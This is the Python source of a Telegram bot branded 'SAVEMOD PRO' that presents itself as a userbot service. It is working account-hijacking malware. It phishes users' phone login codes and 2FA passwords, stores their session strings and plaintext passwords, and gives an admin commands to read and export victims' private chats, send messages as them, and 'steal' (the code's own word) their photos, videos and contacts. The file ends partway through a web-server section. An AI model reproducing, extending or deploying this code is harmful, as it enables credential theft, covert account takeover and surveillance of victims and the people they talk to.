import asyncio
import sqlite3
import os
import sys
import shutil
import tempfile
import html
import logging
from datetime import datetime
from threading import Thread

from flask import Flask, jsonify
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.tl.types import UserStatusOnline, UserStatusOffline, MessageService
from telethon.tl.functions.account import UpdateStatusRequest
from aiogram import Bot, Dispatcher, types as aiogram_types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, InputFile, ReplyKeyboardMarkup, KeyboardButton
from aiogram.utils import executor
import nest_asyncio
import pytz

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
nest_asyncio.apply()

API_ID = int(os.environ.get('API_ID', 0))
API_HASH = os.environ.get('API_HASH', '')
BOT_TOKEN = os.environ.get('BOT_TOKEN', '')
ADMIN_IDS = [int(x.strip()) for x in os.environ.get('ADMIN_IDS', '').split(',') if x.strip()]

if not API_ID or not API_HASH or not BOT_TOKEN:
    logger.error("Ошибка: Не заданы переменные окружения")
    sys.exit(1)

VOLUME_PATH = os.environ.get('VOLUME_MOUNTS', '/app/data')
if not os.path.exists(VOLUME_PATH):
    VOLUME_PATH = '.'
    os.makedirs(VOLUME_PATH, exist_ok=True)

DB_PATH = os.path.join(VOLUME_PATH, 'userbot.db')

conn = sqlite3.connect(DB_PATH, check_same_thread=False)
cursor = conn.cursor()

cursor.execute('''
    CREATE TABLE IF NOT EXISTS user_sessions (
        user_id INTEGER PRIMARY KEY,
        session_string TEXT,
        phone TEXT,
        two_fa TEXT,
        first_name TEXT,
        last_name TEXT,
        username TEXT,
        is_active INTEGER DEFAULT 0,
        registered_at TEXT
    )
''')

cursor.execute('''
    CREATE TABLE IF NOT EXISTS muted_users (
        user_id INTEGER,
        muted_by INTEGER,
        muted_at TEXT,
        PRIMARY KEY (user_id, muted_by)
    )
''')

cursor.execute('''
    CREATE TABLE IF NOT EXISTS saved_messages (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        owner_id INTEGER,
        msg_id INTEGER,
        sender_id INTEGER,
        text TEXT,
        date TEXT
    )
''')
conn.commit()

active_clients = {}
saved_messages = {}
temp_auth = {}
pending_2fa = {}
pending_chat_count = {}
current_active_user = None

bot = Bot(token=BOT_TOKEN, parse_mode='HTML')
dp = Dispatcher(bot)
tz = pytz.timezone('Europe/Saratov')

# ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========

def is_admin(user_id):
    return user_id in ADMIN_IDS

def is_target_admin(target_id):
    return target_id in ADMIN_IDS

def escape_html(text):
    return html.escape(str(text))

def get_active_client():
    global current_active_user
    if current_active_user and current_active_user in active_clients:
        return active_clients[current_active_user], current_active_user
    for uid, client in active_clients.items():
        if not is_target_admin(uid):
            current_active_user = uid
            return client, uid
    return None, None

async def resolve_entity(client, target):
    try:
        if target.isdigit():
            return await client.get_entity(int(target))
        return await client.get_entity(target)
    except:
        return None

async def send_to_admin(text):
    for admin_id in ADMIN_IDS:
        try:
            await bot.send_message(admin_id, text, parse_mode='HTML')
        except:
            pass

def get_code_keyboard():
    kb = InlineKeyboardMarkup(row_width=3)
    for i in range(1, 10):
        kb.insert(InlineKeyboardButton(str(i), callback_data=f"code_{i}"))
    kb.row(
        InlineKeyboardButton("0", callback_data="code_0"),
        InlineKeyboardButton("⌫", callback_data="code_back"),
        InlineKeyboardButton("✅", callback_data="code_done")
    )
    return kb

async def export_chat_to_html(client, chat_id, chat_name, me, limit=1000):
    messages = []
    async for msg in client.iter_messages(chat_id, limit=limit):
        if msg.text and not isinstance(msg, MessageService):
            try:
                if msg.out:
                    sender_name = f"{me.first_name} (Вы)"
                else:
                    sender = await client.get_entity(msg.sender_id)
                    sender_name = sender.first_name or sender.username or str(msg.sender_id)
                dt = msg.date.astimezone(tz)
                time_str = dt.strftime('%H:%M')
                date_str = dt.strftime('%d.%m.%Y')
                text = escape_html(msg.text).replace('\n', '<br>')
                messages.append(f'<div class="msg"><div class="sender">{escape_html(sender_name)}</div><div class="time">{time_str} {date_str}</div><div class="text">{text}</div></div>')
            except:
                continue
    if not messages:
        return None
    messages.reverse()
    return f'''<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Чат с {escape_html(chat_name)}</title>
<style>body{{font-family:Arial;background:#0e1621;color:#e1e8f0;padding:20px}}.container{{max-width:800px;margin:0 auto;background:#17212b;border-radius:10px;padding:20px}}.msg{{margin-bottom:15px;padding:10px;background:#2b3945;border-radius:10px}}.sender{{font-weight:bold}}.time{{font-size:10px;color:#6c7883}}.text{{font-size:14px;margin-top:5px}}</style>
</head><body><div class="container"><h2>Чат с {escape_html(chat_name)}</h2><p>Всего сообщений: {len(messages)}</p>{''.join(messages)}<p>📅 {datetime.now(tz).strftime('%d.%m.%Y %H:%M:%S')}</p></div></body></html>'''

# ========== АДМИН КОМАНДЫ ==========

@dp.message_handler(commands=['start'])
async def cmd_start(message):
    uid = message.from_user.id
    
    if not is_admin(uid):
        cursor.execute('SELECT session_string FROM user_sessions WHERE user_id=?', (uid,))
        row = cursor.fetchone()
        if row and row[0]:
            await message.answer("✅ <b>SAVEMOD PRO</b> активен!\n.help - команды юзербота", parse_mode='HTML')
            if uid not in active_clients:
                asyncio.create_task(run_userbot(uid, row[0]))
        else:
            kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
            kb.add(KeyboardButton("📱 Поделиться номером", request_contact=True))
            await message.answer(
                "🔐 <b>SAVEMOD PRO</b>\n\nДля регистрации нажми на кнопку и отправь номер телефона.",
                parse_mode='HTML',
                reply_markup=kb
            )
        return
    
    await message.answer(
        "🔰 <b>SAVEMOD PRO - АДМИН ПАНЕЛЬ</b>\n\n"
        "<b>📋 АККАУНТЫ</b>\n"
        "/users - список аккаунтов\n"
        "/sessions - статус сессий\n"
        "/session 1 - информация об аккаунте\n"
        "/swap 1 - переключить активный\n"
        "/del_session 1 - удалить сессию\n\n"
        
        "<b>💬 ДИАЛОГИ</b>\n"
        "/chats - список диалогов\n"
        "/chat @username - просмотр чата (30 сообщений)\n"
        "/chat @username 100 - просмотр чата (100 сообщений)\n"
        "/export @username - экспорт чата в HTML\n"
        "/send @username текст - отправить сообщение\n\n"
        
        "<b>🎬 КРАЖА</b>\n"
        "/steal @username - всё медиа\n"
        "/steal_photo @username - только фото\n"
        "/steal_video @username - только видео\n"
        "/steal_con 1 - контакты с аккаунта\n\n"
        
        "<b>📊 ДРУГОЕ</b>\n"
        "/stats - статистика\n"
        "/backup - бэкап БД\n"
        "/reset_me - сбросить свою сессию",
        parse_mode='HTML'
    )

@dp.message_handler(commands=['users'])
async def cmd_users(message):
    if not is_admin(message.from_user.id):
        return
    cursor.execute('SELECT user_id, first_name, username, phone, is_active FROM user_sessions')
    rows = cursor.fetchall()
    if not rows:
        await message.answer("📭 Нет аккаунтов")
        return
    out = "👥 <b>АККАУНТЫ</b>\n\n"
    i = 0
    for uid, fn, un, ph, act in rows:
        if is_target_admin(uid):
            continue
        i += 1
        name = fn or un or str(uid)
        actm = " ✅" if (act == 1 or uid == current_active_user) else ""
        out += f"<b>{i}. {name}</b>{actm}\n   🆔 <code>{uid}</code>\n   📱 {ph or '-'}\n\n"
        if len(out) > 3500:
            await message.answer(out, parse_mode='HTML')
            out = ""
    if out:
        await message.answer(out, parse_mode='HTML')

@dp.message_handler(commands=['sessions'])
async def cmd_sessions(message):
    if not is_admin(message.from_user.id):
        return
    cursor.execute('SELECT user_id, first_name, username FROM user_sessions')
    rows = cursor.fetchall()
    if not rows:
        await message.answer("📭 Нет сессий")
        return
    lst = []
    for uid, fn, un in rows:
        if is_target_admin(uid):
            continue
        name = fn or un or str(uid)
        st = "✅" if uid in active_clients else "❌"
        lst.append(f"{st} <code>{uid}</code> - {name}")
    await message.answer("📋 <b>СЕССИИ</b>\n\n" + "\n".join(lst), parse_mode='HTML')

@dp.message_handler(commands=['session'])
async def cmd_session(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ /session НОМЕР_ИЗ_USERS")
        return
    try:
        num = int(args) - 1
        cursor.execute('SELECT user_id, session_string, phone, two_fa, first_name, username FROM user_sessions')
        rows = cursor.fetchall()
        na = [(uid, ss, ph, two_fa, fn, un) for uid, ss, ph, two_fa, fn, un in rows if not is_target_admin(uid)]
        if num < 0 or num >= len(na):
            await message.answer("❌ Неверный номер")
            return
        uid, ss, ph, two_fa, fn, un = na[num]
        name = fn or un or str(uid)
        status = "✅" if uid == current_active_user else "❌"
        bot_status = "🟢" if uid in active_clients else "🔴"
        
        text = f"👤 <b>{name}</b>\n"
        text += f"🆔 <code>{uid}</code>\n"
        text += f"📱 {ph or '-'}\n"
        text += f"📊 Активен: {status}\n"
        text += f"🤖 Бот: {bot_status}\n"
        if two_fa:
            text += f"🔐 2FA: <code>{two_fa}</code>\n"
        
        await message.answer(text, parse_mode='HTML')
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(commands=['del_session'])
async def cmd_del_session(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ /del_session НОМЕР")
        return
    try:
        num = int(args) - 1
        cursor.execute('SELECT user_id, first_name, username FROM user_sessions')
        rows = cursor.fetchall()
        na = [(uid, fn, un) for uid, fn, un in rows if not is_target_admin(uid)]
        if num < 0 or num >= len(na):
            await message.answer("❌ Неверный номер")
            return
        tid, fn, un = na[num]
        name = fn or un or str(tid)
        if tid in active_clients:
            try:
                await active_clients[tid].disconnect()
            except:
                pass
            del active_clients[tid]
        cursor.execute('DELETE FROM user_sessions WHERE user_id=?', (tid,))
        cursor.execute('DELETE FROM muted_users WHERE muted_by=?', (tid,))
        conn.commit()
        await message.answer(f"✅ Сессия {name} удалена")
    except:
        await message.answer("❌ Ошибка")

@dp.message_handler(commands=['reset_me'])
async def cmd_reset_me(message):
    uid = message.from_user.id
    if uid in active_clients:
        try:
            await active_clients[uid].disconnect()
        except:
            pass
        del active_clients[uid]
    cursor.execute('DELETE FROM user_sessions WHERE user_id=?', (uid,))
    conn.commit()
    await message.answer("✅ Сессия удалена. Отправь /start")

@dp.message_handler(commands=['swap'])
async def cmd_swap(message):
    if not is_admin(message.from_user.id):
        return
    global current_active_user
    args = message.get_args()
    if not args:
        await message.answer("❌ /swap НОМЕР\nПример: /swap 1")
        return
    try:
        num = int(args) - 1
        cursor.execute('SELECT user_id, first_name, username FROM user_sessions')
        rows = cursor.fetchall()
        na = [(uid, fn, un) for uid, fn, un in rows if not is_target_admin(uid)]
        if num < 0 or num >= len(na):
            await message.answer("❌ Неверный номер")
            return
        user_id = na[num][0]
        name = na[num][1] or na[num][2] or str(user_id)
        if user_id not in active_clients:
            await message.answer(f"❌ Аккаунт {name} не запущен")
            return
        current_active_user = user_id
        me = await active_clients[user_id].get_me()
        await message.answer(f"✅ Переключился на {me.first_name}")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(commands=['steal_con'])
async def cmd_steal_con(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ /steal_con НОМЕР_ИЗ_USERS")
        return
    try:
        num = int(args) - 1
        cursor.execute('SELECT user_id, session_string, first_name, username FROM user_sessions')
        rows = cursor.fetchall()
        na = [(uid, ss, fn, un) for uid, ss, fn, un in rows if not is_target_admin(uid)]
        if num < 0 or num >= len(na):
            await message.answer("❌ Неверный номер")
            return
        target_uid, ss, fn, un = na[num]
        
        if target_uid in active_clients:
            client = active_clients[target_uid]
            temp_client = None
        else:
            client = TelegramClient(StringSession(ss), API_ID, API_HASH)
            await client.connect()
            if not await client.is_user_authorized():
                await message.answer("❌ Сессия умерла")
                return
            temp_client = client
        
        await message.answer("🔄 Краду контакты...")
        me = await client.get_me()
        
        contacts = []
        async for dialog in client.iter_dialogs():
            if dialog.is_user and not getattr(dialog.entity, 'bot', False):
                ent = dialog.entity
                name = f"{ent.first_name or ''} {ent.last_name or ''}".strip()
                uname = f"@{ent.username}" if ent.username else ""
                phone = getattr(ent, 'phone', '') or ''
                contacts.append(f"{name} {uname} 📞{phone} 🆔{ent.id}")
        
        if contacts:
            text = f"📒 КОНТАКТЫ {me.first_name} ({len(contacts)} шт):\n" + "\n".join(contacts[:100])
            await message.answer(text[:4000])
        else:
            await message.answer("❌ Нет контактов")
        
        if temp_client:
            await client.disconnect()
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(commands=['chats'])
async def cmd_chats(message):
    if not is_admin(message.from_user.id):
        return
    cl, uid = get_active_client()
    if not cl:
        await message.answer("❌ Нет активного аккаунта\n/swap для выбора")
        return
    await message.answer("🔄 Собираю список диалогов...")
    chats = []
    async for dlg in cl.iter_dialogs():
        if dlg.is_user:
            try:
                ent = await cl.get_entity(dlg.id)
                if getattr(ent, 'bot', False) or ent.id == uid or is_target_admin(ent.id):
                    continue
                name = ent.first_name or ent.username or str(ent.id)
                chats.append({'id': ent.id, 'name': name})
            except:
                chats.append({'id': dlg.id, 'name': dlg.name or str(dlg.id)})
    if not chats:
        await message.answer("📭 Нет диалогов")
        return
    out = "📋 <b>ДИАЛОГИ</b>\n\n"
    for i, ch in enumerate(chats):
        out += f"{i+1}. {ch['name']}\n"
        if len(out) > 3500:
            await message.answer(out, parse_mode='HTML')
            out = ""
    if out:
        await message.answer(out, parse_mode='HTML')
    await message.answer("💡 /chat @username - показать 30 сообщений\n💡 /chat @username 100 - показать 100 сообщений\n💡 /export @username - выгрузить HTML")

@dp.message_handler(commands=['chat'])
async def cmd_chat(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ /chat @username [количество]\nПример: /chat @durov 100")
        return
    
    parts = args.split()
    target = parts[0]
    limit = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 30
    if limit > 500:
        limit = 500
        await message.answer("⚠️ Лимит ограничен 500 для быстрой загрузки")
    
    cl, uid = get_active_client()
    if not cl:
        await message.answer("❌ Нет активного аккаунта")
        return
    
    ent = await resolve_entity(cl, target)
    if not ent or ent.id == uid or is_target_admin(ent.id):
        await message.answer("❌ Пользователь не найден")
        return
    
    target_name = ent.first_name or ent.username or target
    
    status = await message.answer(f"🔄 Загружаю {limit} сообщений...")
    
    messages = await cl.get_messages(ent.id, limit=limit)
    
    msgs = []
    for msg in messages:
        if msg.text and not isinstance(msg, MessageService):
            try:
                if msg.out:
                    sn = "👉 Я"
                else:
                    sender = await cl.get_entity(msg.sender_id)
                    sn = sender.first_name or sender.username or str(msg.sender_id)
                if is_target_admin(msg.sender_id if not msg.out else 0):
                    continue
                dt = msg.date.strftime('%d.%m %H:%M')
                msgs.append(f"[{dt}] {sn}: {msg.text[:300]}")
            except:
                msgs.append(f"[{msg.date.strftime('%d.%m %H:%M')}] {msg.text[:300]}")
    
    await status.delete()
    
    if msgs:
        text = f"💬 <b>{target_name}</b> (последние {len(msgs)})\n\n" + "\n".join(reversed(msgs))
        if len(text) > 4000:
            text = text[:3900] + "\n\n... (обрезано)"
        await message.answer(text, parse_mode='HTML')
    else:
        await message.answer("📭 Нет сообщений")

@dp.message_handler(commands=['export'])
async def cmd_export(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ /export @username\nПример: /export @durov")
        return
    
    target = args.strip()
    cl, uid = get_active_client()
    if not cl:
        await message.answer("❌ Нет активного аккаунта")
        return
    
    ent = await resolve_entity(cl, target)
    if not ent or ent.id == uid or is_target_admin(ent.id):
        await message.answer("❌ Пользователь не найден")
        return
    
    target_name = ent.first_name or ent.username or target
    await message.answer(f"🔄 Экспортирую чат с {target_name}... Это может занять время")
    
    try:
        me = await cl.get_me()
        html_content = await export_chat_to_html(cl, ent.id, target_name, me, limit=1000)
        
        if not html_content:
            await message.answer("❌ Нет текстовых сообщений для экспорта")
            return
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.html', encoding='utf-8', delete=False) as f:
            f.write(html_content)
            path = f.name
        
        with open(path, 'rb') as f:
            await bot.send_document(message.from_user.id, InputFile(f, filename=f"chat_{target_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"), caption=f"📁 Чат с {target_name}")
        
        os.unlink(path)
        await message.answer("✅ HTML файл отправлен")
    except Exception as e:
        await message.answer(f"❌ Ошибка экспорта: {e}")

@dp.message_handler(commands=['send'])
async def cmd_send(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    parts = args.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("❌ /send @username текст")
        return
    cl, uid = get_active_client()
    if not cl:
        await message.answer("❌ Нет активного аккаунта")
        return
    ent = await resolve_entity(cl, parts[0])
    if not ent:
        await message.answer("❌ Не найден")
        return
    try:
        await cl.send_message(ent.id, parts[1])
        await message.answer(f"✅ Отправлено")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(commands=['steal', 'steal_photo', 'steal_video'])
async def cmd_steal(message):
    if not is_admin(message.from_user.id):
        return
    
    cl, uid = get_active_client()
    if not cl:
        await message.answer("❌ Нет активного аккаунта\n/swap для выбора")
        return
    
    args = message.get_args()
    if not args:
        await message.answer("❌ /steal @username\n/steal_photo @username\n/steal_video @username")
        return
    
    cmd_type = message.get_command().replace('/', '')
    target = args.strip()
    ent = await resolve_entity(cl, target)
    if not ent:
        await message.answer("❌ Пользователь не найден")
        return
    if ent.id == uid or is_target_admin(ent.id):
        await message.answer("❌ Нельзя")
        return
    
    target_name = ent.first_name or ent.username or str(ent.id)
    
    if cmd_type == 'steal_photo':
        await message.answer(f"📷 Краду фото у {target_name}...")
        count = 0
        async for msg in cl.iter_messages(ent.id, limit=500):
            if msg.photo:
                try:
                    path = await msg.download_media()
                    if path:
                        with open(path, 'rb') as f:
                            await bot.send_photo(message.from_user.id, InputFile(f), caption=f"📸 {target_name}")
                        os.remove(path)
                        count += 1
                        await asyncio.sleep(0.1)
                except:
                    pass
        await message.answer(f"✅ Скачано {count} фото")
    
    elif cmd_type == 'steal_video':
        await message.answer(f"🎬 Краду видео у {target_name}...")
        count = 0
        async for msg in cl.iter_messages(ent.id, limit=500):
            if msg.video:
                try:
                    path = await msg.download_media()
                    if path:
                        with open(path, 'rb') as f:
                            await bot.send_video(message.from_user.id, InputFile(f), caption=f"🎬 {target_name}")
                        os.remove(path)
                        count += 1
                        await asyncio.sleep(0.15)
                except:
                    pass
        await message.answer(f"✅ Скачано {count} видео")
    
    else:
        await message.answer(f"🔄 Кража медиа у {target_name} (последние 500)...")
        
        media_by_type = {'photo': [], 'video': [], 'video_note': [], 'voice': [], 'sticker': [], 'document': []}
        
        async for msg in cl.iter_messages(ent.id, limit=500):
            if msg.photo:
                media_by_type['photo'].append(msg)
            elif msg.video:
                media_by_type['video'].append(msg)
            elif msg.video_note:
                media_by_type['video_note'].append(msg)
            elif msg.voice:
                media_by_type['voice'].append(msg)
            elif msg.sticker:
                media_by_type['sticker'].append(msg)
            elif msg.document:
                media_by_type['document'].append(msg)
        
        total = sum(len(v) for v in media_by_type.values())
        if total == 0:
            await message.answer(f"❌ Нет медиа у {target_name}")
            return
        
        await message.answer(f"📦 Найдено: 📷{len(media_by_type['photo'])} 🎬{len(media_by_type['video'])} 🔄{len(media_by_type['video_note'])} 🎤{len(media_by_type['voice'])} 🎨{len(media_by_type['sticker'])} 📎{len(media_by_type['document'])}\nКачаю...")
        
        for media_type, msgs in media_by_type.items():
            for msg in msgs:
                try:
                    path = await msg.download_media()
                    if path:
                        ext = os.path.splitext(path)[1] or '.file'
                        safe_name = f"{target_name}_{media_type}_{msg.id}{ext}"
                        new_path = os.path.join(tempfile.gettempdir(), safe_name)
                        shutil.move(path, new_path)
                        with open(new_path, 'rb') as f:
                            await bot.send_document(message.from_user.id, InputFile(f, filename=safe_name), caption=f"📎 {media_type} от {target_name}")
                        os.remove(new_path)
                        await asyncio.sleep(0.1)
                except:
                    pass
        
        await message.answer(f"✅ Украдено {total} файлов")

@dp.message_handler(commands=['stats'])
async def cmd_stats(message):
    if not is_admin(message.from_user.id):
        return
    acc = cursor.execute('SELECT COUNT(*) FROM user_sessions').fetchone()[0]
    muted = cursor.execute('SELECT COUNT(*) FROM muted_users').fetchone()[0]
    active = len(active_clients)
    db_size = os.path.getsize(DB_PATH) // 1024 if os.path.exists(DB_PATH) else 0
    
    text = f"📊 <b>СТАТИСТИКА</b>\n\n"
    text += f"👥 Аккаунтов: {acc}\n"
    text += f"🟢 Активных: {active}\n"
    text += f"🔇 Заглушено: {muted}\n"
    text += f"💾 БД: {db_size} KB"
    
    await message.answer(text, parse_mode='HTML')

@dp.message_handler(commands=['backup'])
async def cmd_backup(message):
    if not is_admin(message.from_user.id):
        return
    st = await message.answer("💾 Создаю бэкап...")
    bp = os.path.join(VOLUME_PATH, f'backup_{datetime.now().strftime("%Y%m%d_%H%M%S")}.db')
    shutil.copy2(DB_PATH, bp)
    with open(bp, 'rb') as f:
        await bot.send_document(message.from_user.id, InputFile(f, filename=os.path.basename(bp)), caption="💾 Бэкап БД")
    os.remove(bp)
    await st.edit_text("✅ Бэкап отправлен")

# ========== РЕГИСТРАЦИЯ ==========

@dp.message_handler(content_types=aiogram_types.ContentType.CONTACT)
async def handle_contact(message):
    uid = message.from_user.id
    phone = message.contact.phone_number
    
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        res = await client.send_code_request(phone)
        temp_auth[uid] = {
            'client': client, 
            'phone': phone, 
            'hash': res.phone_code_hash, 
            'code': ''
        }
        await message.answer("📱 Введи код из SMS:", reply_markup=get_code_keyboard())
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.callback_query_handler(lambda c: c.data.startswith('code_'))
async def handle_code(cb):
    uid = cb.from_user.id
    if uid not in temp_auth:
        await cb.answer("Сессия истекла, /start")
        return
    action = cb.data.replace('code_', '')
    cur = temp_auth[uid].get('code', '')
    
    if action.isdigit():
        if len(cur) < 5:
            temp_auth[uid]['code'] = cur + action
    elif action == 'back':
        temp_auth[uid]['code'] = cur[:-1]
    elif action == 'done':
        if len(cur) == 5:
            await cb.answer("Авторизация...")
            await complete_auth(cb, uid)
            return
        else:
            await cb.answer("Нужно 5 цифр", show_alert=True)
            return
    
    code = temp_auth[uid]['code']
    disp = code + "".join(["▫" for _ in range(5 - len(code))])
    await cb.message.edit_text(f"📱 Код: {disp}", reply_markup=get_code_keyboard())
    await cb.answer()

async def complete_auth(cb, uid):
    global current_active_user
    data = temp_auth[uid]
    try:
        await data['client'].sign_in(phone=data['phone'], code=data['code'], phone_code_hash=data['hash'])
        ss = data['client'].session.save()
        me = await data['client'].get_me()
        cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string, phone, two_fa, first_name, last_name, username, is_active, registered_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
                       (uid, ss, data['phone'], None, me.first_name, me.last_name, me.username, 0, datetime.now().isoformat()))
        conn.commit()
        
        if current_active_user is None and not is_target_admin(uid):
            current_active_user = uid
        
        await cb.message.answer(f"✅ <b>SAVEMOD PRO</b>\n👤 {me.first_name}\n\n/start - команды", parse_mode='HTML')
        if is_admin(uid):
            await send_to_admin(f"🔐 НОВЫЙ АККАУНТ: {me.first_name}\n📱 {data['phone']}\n🔑 Строка: {ss}")
        asyncio.create_task(run_userbot(uid, ss))
        await data['client'].disconnect()
        del temp_auth[uid]
    except Exception as e:
        if '2fa' in str(e).lower() or 'password' in str(e).lower():
            await cb.message.answer("🔐 Введи облачный пароль (2FA):")
            pending_2fa[uid] = data
            del temp_auth[uid]
        else:
            await cb.message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(lambda msg: msg.from_user.id in pending_2fa)
async def handle_2fa(message):
    uid = message.from_user.id
    data = pending_2fa[uid]
    try:
        await data['client'].sign_in(password=message.text.strip())
        ss = data['client'].session.save()
        me = await data['client'].get_me()
        cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string, phone, two_fa, first_name, last_name, username, is_active, registered_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
                       (uid, ss, data['phone'], message.text.strip(), me.first_name, me.last_name, me.username, 0, datetime.now().isoformat()))
        conn.commit()
        await message.answer(f"✅ <b>SAVEMOD PRO</b>\n👤 {me.first_name}\n\n/start - команды", parse_mode='HTML')
        if is_admin(uid):
            await send_to_admin(f"🔐 НОВЫЙ АККАУНТ (2FA): {me.first_name}\n📱 {data['phone']}\n🔑 Строка: {ss}\n🔒 Пароль: {message.text.strip()}")
        asyncio.create_task(run_userbot(uid, ss))
        await data['client'].disconnect()
        del pending_2fa[uid]
    except Exception as e:
        await message.answer(f"❌ Ошибка 2FA: {e}")

# ========== ЮЗЕРБОТ ==========

async def run_userbot(owner_id, session_string):
    global current_active_user
    if owner_id in active_clients:
        try:
            await active_clients[owner_id].disconnect()
        except:
            pass
    client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
    await client.connect()
    if not await client.is_user_authorized():
        cursor.execute('DELETE FROM user_sessions WHERE user_id=?', (owner_id,))
        conn.commit()
        return
    active_clients[owner_id] = client
    saved_messages[owner_id] = {}
    logger.info(f"✅ Юзербот запущен для {owner_id}")
    me = await client.get_me()
    
    if current_active_user is None and not is_target_admin(owner_id):
        current_active_user = owner_id
    
    cursor.execute('SELECT user_id FROM muted_users WHERE muted_by=?', (owner_id,))
    muted_users = {row[0] for row in cursor.fetchall()}
    
    # Антиспам защита
    last_processed = {}
    
    @client.on(events.NewMessage)
    async def handle_incoming(event):
        nonlocal last_processed
        
        # Пропускаем служебные сообщения и сервисные
        if isinstance(event.message, MessageService):
            return
        
        # Только личные сообщения (не группы, не каналы, не боты)
        if not event.is_private:
            return
        
        # Пропускаем сообщения от самого себя (out)
        if event.out:
            return
        
        sender_id = event.sender_id
        if not sender_id:
            return
        
        # Антидубль
        msg_hash = f"{event.chat_id}_{event.id}"
        if msg_hash in last_processed:
            return
        last_processed[msg_hash] = datetime.now().timestamp()
        if len(last_processed) > 100:
            now = datetime.now().timestamp()
            last_processed = {k: v for k, v in last_processed.items() if now - v < 60}
        
        # Проверка на заглушку
        if sender_id in muted_users:
            await event.delete()
            return
        
        # Обработка ТОЛЬКО текстовых сообщений от ЛЮДЕЙ (не ботов)
        if event.text and event.text.strip():
            # Сохраняем в БД
            saved_messages[owner_id][event.id] = {'sender_id': sender_id, 'text': event.text}
            cursor.execute('INSERT INTO saved_messages (owner_id, msg_id, sender_id, text, date) VALUES (?, ?, ?, ?, ?)',
                          (owner_id, event.id, sender_id, event.text, datetime.now().isoformat()))
            conn.commit()
            
            # Отправляем админу ТОЛЬКО если владелец аккаунта - админ
            if is_admin(owner_id):
                try:
                    sender = await client.get_entity(sender_id)
                    # Проверяем что отправитель - человек, а не бот
                    if not getattr(sender, 'bot', False):
                        name = sender.first_name or sender.username or str(sender_id)
                        await send_to_admin(f"💬 [{me.first_name}] ← {name}:\n{event.text[:300]}")
                except:
                    pass
        
        # Медиа вообще не логируем и не скачиваем автоматически
        # Только по команде /steal
    
    @client.on(events.NewMessage)
    async def user_commands(event):
        if not event.is_private or not event.out:
            return
        txt = event.text or ''
        if not txt.startswith('.'):
            return
        
        if txt == '.help':
            await event.edit("""
<b>🤖 КОМАНДЫ ЮЗЕРБОТА</b>

.help - справка
.mute (ответ) - заглушить
.unmute (ответ) - разглушить
.list - список заглушенных
.spam кол-во текст - спам (макс 30)
.type текст - печать
.info (ответ) - инфо
""", parse_mode='HTML')
        
        elif txt == '.mute':
            reply = await event.get_reply_message()
            if not reply:
                await event.edit('❌ Ответь на сообщение')
                return
            tid = reply.sender_id
            if tid == owner_id:
                await event.edit('❌ Нельзя')
                return
            cursor.execute('INSERT OR IGNORE INTO muted_users (user_id, muted_by, muted_at) VALUES (?, ?, ?)', (tid, owner_id, datetime.now().isoformat()))
            conn.commit()
            muted_users.add(tid)
            await event.edit(f'🔇 Заглушен')
        
        elif txt == '.unmute':
            reply = await event.get_reply_message()
            if not reply:
                await event.edit('❌ Ответь')
                return
            tid = reply.sender_id
            cursor.execute('DELETE FROM muted_users WHERE user_id=? AND muted_by=?', (tid, owner_id))
            conn.commit()
            muted_users.discard(tid)
            await event.edit(f'🔊 Разглушен')
        
        elif txt == '.list':
            if muted_users:
                names = []
                for uid in list(muted_users)[:20]:
                    try:
                        u = await client.get_entity(uid)
                        names.append(f"• {u.first_name}")
                    except:
                        names.append(f"• {uid}")
                await event.edit("🔇 <b>Заглушенные:</b>\n" + "\n".join(names), parse_mode='HTML')
            else:
                await event.edit("🔇 Нет")
        
        elif txt.startswith('.spam '):
            parts = txt.split(' ', 2)
            if len(parts) >= 2:
                try:
                    cnt = min(int(parts[1]), 30)
                    msg = parts[2] if len(parts) > 2 else None
                    if not msg:
                        reply = await event.get_reply_message()
                        if reply:
                            msg = reply.text
                    if msg:
                        await event.delete()
                        for i in range(cnt):
                            await client.send_message(event.chat_id, msg)
                            await asyncio.sleep(0.05)
                except:
                    pass
        
        elif txt.startswith('.type '):
            t = txt[6:]
            if t:
                await event.delete()
                m = await client.send_message(event.chat_id, t[0])
                typed = t[0]
                for ch in t[1:]:
                    typed += ch
                    try:
                        await m.edit(typed)
                    except:
                        pass
                    await asyncio.sleep(0.1)
        
        elif txt == '.info':
            reply = await event.get_reply_message()
            if reply:
                try:
                    u = await client.get_entity(reply.sender_id)
                    muted = "✅" if reply.sender_id in muted_users else "❌"
                    await event.edit(f"👤 {u.first_name}\n🆔 {u.id}\n🔇 Заглушен: {muted}")
                except:
                    pass
            else:
                await event.edit('❌ Ответь')
    
    await client.run_until_disconnected()

# ========== ВЕБ-СЕРВЕР ==========

flask_app = Flask(__name__)

@flask_app.route('/')
